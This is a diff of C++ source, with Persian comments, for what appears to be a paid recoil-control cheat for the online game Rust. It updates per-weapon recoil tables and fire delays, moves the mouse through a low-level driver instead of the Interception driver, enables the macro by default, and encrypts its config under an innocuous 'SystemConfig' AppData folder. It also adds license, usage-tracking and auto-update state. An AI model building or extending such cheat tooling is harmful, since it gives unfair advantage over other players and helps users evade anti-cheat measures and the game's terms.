-const std::vector<double> LR300_OFFSET_X = {0.0, 0.016310668448276, 0.016310668448276, 0.016310668448276, 0.01010668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014400668448276, 0.014300668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.015310668448276, 0.017310668448276, 0.017310668448276, 0.017310668448276, 0.017410668448276, 0.017310668448276, 0.017310668448276, 0.017310668448276};
-const std::vector<double> LR300_OFFSET_Y = {-1.25, -1.253, -1.255, -1.257, -1.257, -1.257, -1.257, -1.256, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255};
-const double LR300_RPM_DELAY = 120.0; 
-const int LR300_BULLETS = LR300_OFFSET_Y.size();
+// برای سادگی، جدول مرجع اصلی را به‌صورت vector<array<double,2>> نگه می‌داریم و بعداً در تابع
+// recalculate_all_profiles_threadsafe آن را به وکتورهای X/Y تبدیل می‌کنیم.
 
-const std::vector<double> THOMPSON_OFFSET_X = {-0.085809965, 0.006514516, 0.007734019, 0.048618872, 0.078056445, -0.066088665, 0.067429669, 0.02780332, 0.133849085, 0.025890565, -0.061893655, 0.019062548, 0.061710655, -0.091478981, 0.021023053, -0.08700972, -0.200583254, -0.0398146, 0.003178508};
-const std::vector<double> THOMPSON_OFFSET_Y = {-0.510477526, -0.509449769, -0.51512903, -0.519510046, -0.494714729, -0.498322988, -0.509388516, -0.479468436, -0.48205394, -0.509083505, -0.502620747, -0.485474444, -0.493339713, -0.502579241, -0.502866742, -0.52610755, -0.50284349, -0.51412102, -0.487279713};
-const double THOMPSON_RPM_DELAY = 129.87013; 
-const int THOMPSON_BULLETS = THOMPSON_OFFSET_Y.size();
+enum WeaponIndex {
+    WEAPON_NONE = 0,
+    WEAPON_AK47,
+    WEAPON_LR300,
+    WEAPON_M249,
+    WEAPON_HMLMG,
+    WEAPON_MP5,
+    WEAPON_THOMPSON,
+    WEAPON_CUSTOM,
+    WEAPON_PYTHON,
+    WEAPON_SEMI,
+    WEAPON_MAX
+};
 
-const std::vector<double> SAR_OFFSET_X = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0};
-const std::vector<double> SAR_OFFSET_Y = {-0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775};
-const double SAR_RPM_DELAY = 174.927114; 
-const int SAR_BULLETS = SAR_OFFSET_Y.size();
+// جدول جدید ریکویل: {dx, dy} برای هر تیر
+const std::vector<std::vector<std::array<double, 2>>> recoil_tables = {
+    /* None */ { { { 0.0, 0.0 } } },
 
-const std::vector<double> MP5A4_OFFSET_X = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0};
-const std::vector<double> MP5A4_OFFSET_Y = {-0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64};
-const double MP5A4_RPM_DELAY = 100.0;
-const int MP5A4_BULLETS = MP5A4_OFFSET_Y.size();
+    /* AK-47 */ {
+        {0.000000, -2.257792}, {0.323242, -2.300758}, {0.649593, -2.299759}, {0.848786, -2.259034},
+        {1.075408, -2.323947}, {1.268491, -2.215956}, {1.330963, -2.236556}, {1.336833, -2.218203},
+        {1.505516, -2.143454}, {1.504423, -2.233091}, {1.442116, -2.270194}, {1.478543, -2.204318},
+        {1.392874, -2.165817}, {1.480824, -2.177887}, {1.597069, -2.270915}, {1.449996, -2.145893},
+        {1.369179, -2.270450}, {1.582363, -2.298334}, {1.516872, -2.235066}, {1.498249, -2.238401},
+        {1.465769, -2.331642}, {1.564812, -2.242621}, {1.517519, -2.303052}, {1.422433, -2.211946},
+        {1.553195, -2.248043}, {1.510463, -2.285327}, {1.553878, -2.240047}, {1.520380, -2.221839},
+        {1.553878, -2.240047}, {1.553195, -2.248043}
+    },
 
-const std::vector<double> HMLMG_OFFSET_X = {0.0, -0.506458333, -0.506458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -1.5226458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333};
-const std::vector<double> HMLMG_OFFSET_Y = {-1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.37375, -1.347375, -1.347375, -1.347375, -1.347375, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333};
-const double HMLMG_RPM_DELAY = 125.0; // 60000 / 125 RPM = 480 ms
-const int HMLMG_BULLETS = HMLMG_OFFSET_Y.size();
+    /* LR-300 */ {
+        {0.000000, -2.052616}, {0.055584, -1.897695}, {-0.247226, -1.863222}, {-0.243871, -1.940010},
+        {0.095727, -1.966751}, {0.107707, -1.885520}, {0.324888, -1.946722}, {-0.181137, -1.880342},
+        {0.162399, -1.820107}, {-0.292076, -1.994940}, {0.064575, -1.837156}, {-0.126699, -1.887880},
+        {-0.090568, -1.832799}, {0.065338, -1.807480}, {-0.197343, -1.705888}, {-0.216561, -1.785949},
+        {0.042567, -1.806371}, {-0.065534, -1.757623}, {0.086380, -1.904010}, {-0.097326, -1.969296},
+        {-0.213034, -1.850288}, {-0.017790, -1.730867}, {-0.045577, -1.783686}, {-0.053309, -1.886260},
+        {0.055072, -1.793076}, {-0.091874, -1.921906}, {-0.033719, -1.796160}, {0.266464, -1.993952},
+        {0.079090, -1.921165}
+    },
 
-const std::vector<double> M249_OFFSET_X = {0.0, 0.39375, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525};
-const std::vector<double> M249_OFFSET_Y = {-0.89, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.00, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100};
-const double M249_RPM_DELAY = 120.0;
-const int M249_BULLETS = M249_OFFSET_Y.size();
+    /* M249 */ {
+        {0.0, -1.49}, {0.39375, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49}, {0.72, -1.49},
+        // ادامه ردیف‌ها با 0.0, -1.49 برای تکمیل ظرفیت خشاب (این دقت برای کنترل ریکویل کافی است)
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49},
+        {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}, {0.0, -1.49}
+    },
+
+    /* HMLMG */ {
+        {0.0, -1.4}, {-0.39, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4},
+        {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}, {-0.73, -1.4}
+    },
+
+    /* MP5 */ {
+        {0.125361, -1.052446}, {-0.099548, -0.931548}, {0.027825, -0.954094}, {-0.013715, -0.851504},
+        {-0.007947, -1.070579}, {0.096096, -1.018017}, {-0.045937, -0.794216}, {0.034316, -1.112618},
+        {-0.003968, -0.930040}, {-0.009403, -0.888503}, {0.140813, -0.970807}, {-0.015052, -1.046551},
+        {0.095699, -0.860475}, {-0.269643, -1.038896}, {0.000285, -0.840478}, {0.018413, -1.038126},
+        {0.099191, -0.851701}, {0.199659, -0.893041}, {-0.082660, -1.069278}, {0.006826, -0.881493},
+        {0.091709, -1.150956}, {-0.108677, -0.965513}, {0.169612, -1.099499}, {-0.038244, -1.120084},
+        {-0.085513, -0.876956}, {0.136279, -1.047589}, {0.196392, -1.039977}, {-0.152513, -1.209291},
+        {-0.214510, -0.956648}, {0.034276, -0.095177}
+    },
+
+    /* Thompson */ {
+        {-0.114413, -0.680635}, {0.008686, -0.676598}, {0.010312, -0.682837}, {0.064825, -0.691345},
+        {0.104075, -0.655618}, {-0.088118, -0.660429}, {0.089906, -0.675183}, {0.037071, -0.632623},
+        {0.178465, -0.634737}, {0.034654, -0.669443}, {-0.082658, -0.664826}, {0.025550, -0.636631},
+        {0.082414, -0.647118}, {-0.123305, -0.662104}, {0.028164, -0.662354}, {-0.117346, -0.693475},
+        {-0.268777, -0.661123}, {-0.053086, -0.677493}, {0.042380, -0.647038}, {0.042380, -0.647038}
+    },
+
+    /* Custom SMG */ {
+        {-0.114414, -0.680635}, {0.008685, -0.676597}, {0.010312, -0.682837}, {0.064825, -0.691344},
+        {0.104075, -0.655617}, {-0.088118, -0.660429}, {0.089906, -0.675183}, {0.037071, -0.632623},
+        {0.178466, -0.634737}, {0.034653, -0.669444}, {-0.082658, -0.664827}, {0.025551, -0.636631},
+        {0.082413, -0.647118}, {-0.123305, -0.662104}, {0.028164, -0.662354}, {-0.117345, -0.693474},
+        {-0.268777, -0.661122}, {-0.053086, -0.677493}, {0.004238, -0.647037}, {0.014169, -0.551440},
+        {-0.009907, -0.552079}, {0.044076, -0.577694}, {-0.043187, -0.549581}
+    },
+
+    /* Python (revolver) */ {
+        {0.0, -5.8}
+    },
+
+    /* Semi (استفاده برای SAR) */ {
+        {0.0, -1.4}
+    }
+};
+
+// تأخیر بین شلیک‌ها (بر حسب میلی‌ثانیه) مطابق جدول UC
+const std::array<double, WEAPON_MAX> weapon_delays = {
+    /* None   */ 0.0,
+    /* AK-47  */ 133.33,
+    /* LR-300 */ 120.0,
+    /* M249   */ 100.0,
+    /* HMLMG  */ 100.0,
+    /* MP5    */ 89.0,
+    /* Thompson */ 113.0,
+    /* Custom */ 90.0,
+    /* Python */ 125.0,
+    /* Semi   */ 175.0
+};
+
+// برای سازگاری با کد موجود، هنوز ثابت‌های per-gun را نگه می‌داریم ولی آن‌ها را از جدول جدید پر می‌کنیم.
+
+// --- Recoil Data (Raw Offsets) (سازگار با کد قدیمی) ---
+std::vector<double> AK47_OFFSET_X;
+std::vector<double> AK47_OFFSET_Y;
+double AK47_RPM_DELAY = weapon_delays[WEAPON_AK47];
+int AK47_BULLETS = 0;
+
+std::vector<double> LR300_OFFSET_X;
+std::vector<double> LR300_OFFSET_Y;
+double LR300_RPM_DELAY = weapon_delays[WEAPON_LR300];
+int LR300_BULLETS = 0;
+
+std::vector<double> THOMPSON_OFFSET_X;
+std::vector<double> THOMPSON_OFFSET_Y;
+double THOMPSON_RPM_DELAY = weapon_delays[WEAPON_THOMPSON];
+int THOMPSON_BULLETS = 0;
+
+std::vector<double> SAR_OFFSET_X;
+std::vector<double> SAR_OFFSET_Y;
+double SAR_RPM_DELAY = weapon_delays[WEAPON_SEMI];
+int SAR_BULLETS = 0;
+
+std::vector<double> MP5A4_OFFSET_X;
+std::vector<double> MP5A4_OFFSET_Y;
+double MP5A4_RPM_DELAY = weapon_delays[WEAPON_MP5];
+int MP5A4_BULLETS = 0;
+
+std::vector<double> HMLMG_OFFSET_X;
+std::vector<double> HMLMG_OFFSET_Y;
+double HMLMG_RPM_DELAY = weapon_delays[WEAPON_HMLMG];
+int HMLMG_BULLETS = 0;
+
+std::vector<double> M249_OFFSET_X;
+std::vector<double> M249_OFFSET_Y;
+double M249_RPM_DELAY = weapon_delays[WEAPON_M249];
+int M249_BULLETS = 0;
+
+// اسلحه‌های جدید
+std::vector<double> CUSTOM_OFFSET_X;
+std::vector<double> CUSTOM_OFFSET_Y;
+double CUSTOM_RPM_DELAY = weapon_delays[WEAPON_CUSTOM];
+int CUSTOM_BULLETS = 0;
+
+std::vector<double> PYTHON_OFFSET_X;
+std::vector<double> PYTHON_OFFSET_Y;
+double PYTHON_RPM_DELAY = weapon_delays[WEAPON_PYTHON];
+int PYTHON_BULLETS = 0;
+
 
 
 // --- Recoil Profile Data Structure ---
@@ -1490,26 +2557,14 @@ struct RecoilProfileData {
 };
 
 // --- Shared State Variables ---
-std::atomic<bool> profile_macro_active{false}; // Renamed from kickback_active
+std::atomic<bool> profile_macro_active{true}; // Renamed from kickback_active
 std::atomic<bool> ui_toggle_key_pressed{false}; // نگهداری وضعیت فشرده شدن کلید UI toggle
-std::string current_gun_profile_str = "";        // Name of the currently selected profile
+std::string current_gun_profile_str = PROFILE_AK47;        // Name of the currently selected profile
 std::mutex profile_mutex;                        // Protects current_gun_profile_str AND calculated_profiles AND g_profile_keybinds
 std::atomic<bool> left_mouse_down{false};        // State of left mouse button
 std::atomic<bool> right_mouse_down{false};       // State of right mouse button
-std::atomic<bool> is_crouched_interception{false}; // برای وضعیت نشسته با Interception
 std::atomic<bool> stop_recoil_flag{false};       // Signal to stop current recoil spray
-
-
-// --- متغیرهای Interception ---
-InterceptionContext context = nullptr;
-InterceptionDevice keyboard_device_id = 0;
-InterceptionDevice mouse_device_id = 0;
-// متغیرهای سراسری برای وضعیت نصب درایور Interception
-bool g_interception_driver_installed = false; // وضعیت نصب درایور
-int g_app_run_count = 0; // تعداد دفعات اجرای برنامه
-bool g_system_restart_required = false; // نیاز به ریستارت سیستم
-bool g_show_restart_message = false; // نمایش پیام ریستارت
-std::string g_restart_message = ""; // پیام ریستارت
+std::atomic<bool> g_recoil_thread_should_run{true}; // Controls lifetime of recoil thread
 std::atomic<bool> show_config_window_atomic{true};
 
 // Enum to manage the current view in the ImGui window
@@ -1535,10 +2590,36 @@ long long g_subscription_duration_seconds = 0;
 std::string g_start_license_str = "N/A"; // <--- متغیر جدید برای ذخیره تاریخ شروع لایسنس
 std::mutex g_license_data_mutex;
 
+std::string g_plan_type = "unknown";
+
+// --- Usage Tracking Variables ---
+// مجموع زمان استفاده از برنامه (بر حسب ثانیه) که در config ذخیره می‌شود
+long long g_total_usage_seconds = 0;
+// زمان شروع اولین سشن بعد از لاگین موفق (برای محاسبه مدت سشن فعلی)
+std::chrono::steady_clock::time_point g_session_start_time;
+
 // --- Remember Me Variables ---
 bool g_remember_me = false; // State of the Remember Me checkbox
 std::string g_saved_license_key = ""; // To store the license key if Remember Me is checked
 int g_license_used_count = -1; // To store the 'used_count' from the license API, -1 indicates not loaded
+
+// --- Update State Variables ---
+std::atomic<bool> g_update_required{false};
+std::atomic<bool> g_update_download_in_progress{false};
+std::atomic<bool> g_update_download_done{false};
+std::atomic<bool> g_update_download_failed{false};
+std::string g_update_download_url;
+std::string g_update_download_error;
+std::string g_update_download_path;
+std::string g_update_new_version; // filled from server if provided
+std::mutex g_update_mutex;
+
+// Download progress (bytes)
+std::atomic<long long> g_update_bytes_downloaded{0};
+std::atomic<long long> g_update_bytes_total{0};
+
+// Flag to request automatic application exit after a successful update
+std::atomic<bool> g_exit_after_update{false};
 
 // Map key to total duration in seconds (Moved inside the check function for simulation)
 // const std::map<std::string, long long> VALID_LICENSE_KEYS = { ... };
@@ -1561,10 +2642,37 @@ static std::map<int, bool> toggle_key_states;
 std::string g_feedback_message = "";
 std::chrono::steady_clock::time_point g_feedback_message_end_time;
 
+std::atomic<bool> g_ui_notice_active(false);
+UINoticeLevel g_ui_notice_level = UINoticeLevel::Info;
+std::string g_ui_notice_title;
+std::string g_ui_notice_message;
+std::string g_ui_notice_details;
+std::mutex g_ui_notice_mutex;
+
 // تابع برای نمایش پیام بازخورد به کاربر
 void show_feedback_message(const std::string& message) {
     g_feedback_message = message;
     g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // نمایش برای 3 ثانیه
+}
+
+void set_ui_notice(UINoticeLevel level,
+                   const std::string& title,
+                   const std::string& message,
+                   const std::string& details) {
+    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
+    g_ui_notice_level = level;
+    g_ui_notice_title = title;
+    g_ui_notice_message = message;
+    g_ui_notice_details = details;
+    g_ui_notice_active.store(true, std::memory_order_relaxed);
+}
+
+void clear_ui_notice() {
+    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
+    g_ui_notice_title.clear();
+    g_ui_notice_message.clear();
+    g_ui_notice_details.clear();
+    g_ui_notice_active.store(false, std::memory_order_relaxed);
 }
 
 // --- Sound Settings ---
@@ -1690,19 +2798,16 @@ void sleep_ms(int ms) {
     }
 }
 
-void move_mouse_relative_interception(int dx, int dy) {
+void move_mouse_relative_core(int dx, int dy) {
     if (dx == 0 && dy == 0) return;
-    if (!context || !mouse_device_id) return;
 
-    InterceptionMouseStroke mouse_stroke;
-    mouse_stroke.x = dx;
-    mouse_stroke.y = dy;
-    mouse_stroke.flags = INTERCEPTION_MOUSE_MOVE_RELATIVE;
-    mouse_stroke.rolling = 0;
-    mouse_stroke.state = 0; // برای حرکت، state مهم نیست
-    mouse_stroke.information = 0;
+    std::call_once(g_core_mouse_init_flag, []() {
+        g_coreMouseDriver.Open();
+    });
 
-    interception_send_ptr(context, mouse_device_id, (InterceptionStroke*)&mouse_stroke, 1);
+    if (g_coreMouseDriver.IsOpen()) {
+        g_coreMouseDriver.MoveMouse(dx, dy);
+    }
 }
 
 // Check key state (using GetAsyncKeyState)
@@ -1715,7 +2820,7 @@ void smoothing(double duration_ms, int target_dx, int target_dy) {
     int steps = std::max(1, static_cast<int>(duration_ms / 10.0)); // Move roughly every 10ms
     if (steps <= 0) { // Handle very short durations or zero movement
         if (target_dx != 0 || target_dy != 0) {
-            move_mouse_relative_interception(target_dx, target_dy);
+            move_mouse_relative_core(target_dx, target_dy);
         }
         if (duration_ms > 0) {
              sleep_ms(static_cast<int>(duration_ms));
@@ -1738,7 +2843,7 @@ void smoothing(double duration_ms, int target_dx, int target_dy) {
         int move_y = custom_round(current_target_y_exact - moved_y);
 
         if (move_x != 0 || move_y != 0) {
-            move_mouse_relative_interception(move_x, move_y);
+            move_mouse_relative_core(move_x, move_y);
             moved_x += move_x;
             moved_y += move_y;
         }
@@ -1758,7 +2863,7 @@ void smoothing(double duration_ms, int target_dx, int target_dy) {
     int final_dx = target_dx - custom_round(moved_x);
     int final_dy = target_dy - custom_round(moved_y);
     if (final_dx != 0 || final_dy != 0) {
-        move_mouse_relative_interception(final_dx, final_dy);
+        move_mouse_relative_core(final_dx, final_dy);
     }
 }
 // Simulate key press/release (needed for SAR and Door Unlocker)
@@ -1931,7 +3036,9 @@ void reset_keybinds_to_defaults() {
         {PROFILE_MP5A4, VK_F7},
         {PROFILE_SAR, VK_F8},
         {PROFILE_HMLMG, VK_F9},
-        {PROFILE_M249, VK_F10}
+        {PROFILE_M249, VK_F10},
+        {PROFILE_CUSTOM, VK_F3},
+        {PROFILE_PYTHON, VK_F2}
     };
     g_ui_toggle_key.store(VK_HOME);
     g_exit_app_key.store(VK_INSERT);
@@ -1939,6 +3046,8 @@ void reset_keybinds_to_defaults() {
     g_rmb_key.store(VK_RBUTTON); // Reset RMB to default
     g_nightModeKey.store(VK_END); // Reset Night Mode Key to default
     g_door_unlock_trigger_key = VK_XBUTTON2; // Reset Door Unlock Trigger to default
+    // Reset Auto Crouch Scope feature to default (disabled)
+    g_auto_crouch_scope_enabled.store(false);
     output_log_message("Keybinds reset to defaults.\n");
 }
 
@@ -2025,13 +3134,29 @@ std::string decrypt_license_key(const std::string& encrypted_key, const std::str
     }
 }
 
-// اعلان تابع get_config_path قبل از استفاده
+// --- Encryption helpers for full config file ---
+// از همان XOR + Base64 استفاده میکنیم تا کل config را رمز کنیم
+std::string encrypt_config_data(const std::string& plain) {
+    if (plain.empty()) return "";
+    return encrypt_license_key(plain, XOR_KEY);
+}
+
+std::string decrypt_config_data(const std::string& encrypted) {
+    if (encrypted.empty()) return "";
+    return decrypt_license_key(encrypted, XOR_KEY);
+}
+
+// اعلان توابع مسیر config قبل از استفاده
 std::string get_config_path();
+std::string get_executable_config_path();     // مسیر کنار exe (فقط برای fallback لود قدیمی)
+std::string get_appdata_config_path();        // مسیر اصلی در AppData ویندوز
 
 // --- Config Loading/Saving ---
 void load_config() {
+    // فقط از مسیر AppData\Local\SystemConfig\config.json استفاده می‌کنیم
     std::string config_path = get_config_path();
     std::ifstream config_file(config_path);
+
     output_log_message("Loading initial config from " + config_path + "...\n");
 
     // Initialize attachment states with defaults
@@ -2058,13 +3183,40 @@ void load_config() {
     if (!config_file.is_open()) {
         std::cerr << "Warning: " << config_path << " not found. Using default settings (Sens=" << SENSITIVITY << ", FOV=" << FOV << ", Default Keybinds, Default Door Unlocker, Global Macro Enabled, Sound Enabled)." << std::endl;
         output_log_message("Warning: " + config_path + " not found. Using defaults.\n");
+        {
+            std::lock_guard<std::mutex> lock(profile_mutex);
+            current_gun_profile_str = PROFILE_AK47;
+            profile_macro_active.store(true);
+        }
+        output_log_message("Default profile selected (first run): " + current_gun_profile_str + "\n");
         return;
     }
 
     nlohmann::json config_json; // Use explicit namespace
     try {
-        config_file >> config_json; // Read and parse JSON from file
+        // کل فایل را به صورت رشته میخوانیم تا بتوانیم اول Decrypt و بعد JSON parse کنیم
+        std::stringstream buffer;
+        buffer << config_file.rdbuf();
+        std::string file_contents = buffer.str();
         config_file.close();
+
+        bool parsed = false;
+
+        // 1) تلاش برای دیکریپت و parse (فرمت جدید رمز شده)
+        std::string decrypted = decrypt_config_data(file_contents);
+        if (!decrypted.empty()) {
+            try {
+                config_json = nlohmann::json::parse(decrypted);
+                parsed = true;
+            } catch (const nlohmann::json::parse_error&) {
+                // اگر دیکریپت اشتباه بود یا فایل قدیمی plaintext بود، به مرحله بعد میرویم
+            }
+        }
+
+        // 2) اگر هنوز parse نشده، تلاش برای parse مستقیم به عنوان JSON خام (سازگاری با نسخههای قدیمی)
+        if (!parsed) {
+            config_json = nlohmann::json::parse(file_contents);
+        }
 
         // --- Load General Settings ---
         if (config_json.contains("Settings")) {
@@ -2083,6 +3235,9 @@ void load_config() {
              }
              if (settings.contains("AutoSaveEnabled") && settings["AutoSaveEnabled"].is_boolean()) {
                  AUTO_SAVE_ENABLED = settings["AutoSaveEnabled"].get<bool>();
+             }
+             if (settings.contains("TotalUsageSeconds") && settings["TotalUsageSeconds"].is_number_integer()) {
+                 g_total_usage_seconds = settings["TotalUsageSeconds"].get<long long>();
              }
          }
         
@@ -2175,7 +3330,21 @@ void load_config() {
                 // حذف خط مربوط به current_weapon_index که تعریف نشده است
                 profile_macro_active.store(true);
                 output_log_message("Loaded saved profile: " + saved_profile + "\n");
+            } else {
+                {
+                    std::lock_guard<std::mutex> lock(profile_mutex);
+                    current_gun_profile_str = PROFILE_AK47;
+                    profile_macro_active.store(true);
+                }
+                output_log_message("Invalid CurrentProfile. Using default profile: " + current_gun_profile_str + "\n");
             }
+        } else {
+            {
+                std::lock_guard<std::mutex> lock(profile_mutex);
+                current_gun_profile_str = PROFILE_AK47;
+                profile_macro_active.store(true);
+            }
+            output_log_message("No CurrentProfile found. Using default profile: " + current_gun_profile_str + "\n");
         }
 
         // --- Load Keybinds ---
@@ -2231,14 +3400,7 @@ void load_config() {
             }
         }
 
-        // --- Load Interception Driver Installation Status ---
-        if (config_json.contains("Interception")) {
-            const auto& interception_settings = config_json["Interception"];
-            if (interception_settings.contains("DriverInstalled") && interception_settings["DriverInstalled"].is_boolean()) {
-                g_interception_driver_installed = interception_settings["DriverInstalled"].get<bool>();
